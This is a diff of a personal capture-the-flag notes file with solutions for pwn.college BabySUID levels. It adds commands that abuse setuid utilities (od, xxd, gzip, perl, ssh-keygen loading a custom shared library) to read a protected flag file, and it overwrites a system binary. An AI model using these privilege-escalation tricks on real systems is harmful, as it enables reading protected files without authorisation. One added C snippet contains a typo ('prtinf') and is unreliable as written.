@@ -1,5 +1,22 @@
 # PWN College BabySUID
 
+## lvl 11
+```sh
+od -A n -a /flag | tr -d ' ,\n' | sed 's/nl/\n/'
+```
+`-A n` toglie la colonna degli indirizzi di sinistra, `-a` stampa caratteri
+`tr -d ' ,\n'` toglie gli spazi e `\n`
+`sed 's/nl/\n/'` sostituisce nl con `\n`
+
+## lvl 12
+```sh
+hd -f /flag
+```
+## lvl 13
+```sh
+xxd /flag | xxd -r
+```
+
 ## lvl 14
 
 ~~~sh
@@ -16,12 +33,13 @@ base64 /flag | base64 -d
 
 ~~~sh
 split -l 1 /flag
+cat <split_output_file>
 ~~~
 
 ## lvl 17
 
 ~~~sh
-gzip -kcv /flag | gzip -dcv
+gzip -kcv /flag | gzip -dv
 ~~~
 
 ## lvl 18
@@ -78,7 +96,7 @@ find / -name flag -exec grep "pwn.college" {} \;
 
 ## lvl 26
 
-~~~sh
+~~~makefile
 # create a file called makefile and put inside:
 # and just run make
 
@@ -173,6 +191,7 @@ cp -i --no-preserve=mode,ownership /flag /home/hacker/flag
 
 ~~~sh
 mv /usr/bin/cat /usr/bin/mv
+# challenge file again to set setuid
 mv /flag
 ~~~
 
@@ -192,6 +211,12 @@ print $_;
 
 close(FH);
 ~~~
+
+```perl
+open(FLAG,"/flag");
+print <FLAG>;
+close FLAG;
+```
 
 ## lvl 42
 ~~~py
@@ -213,7 +238,7 @@ print file
 ~~~sh
 #!/usr/bin/bash -p
 file="/flag"
-printf "%s" "$(<$file)" oppure cat /flag
+printf "%s" "$(<$file)" # oppure cat /flag
 ~~~
 
 ## lvl 45
@@ -270,6 +295,21 @@ void __attribute__ ((constructor)) constructor(){
 }
 void C_GetFunctionList(){}
 ~~~
+
+```c
+FILE *f = fopen("/flag","r");
+char buffer[80];
+
+fgets(buffer,80,f);
+prtinf("%s\n",buffer);
+fclose(f);
+
+```
+
+```sh
+gcc -shared -o lib.so script.c
+ssh-keygen -D ./lib.so
+```
 
 ~~~makefile
 CC=gcc
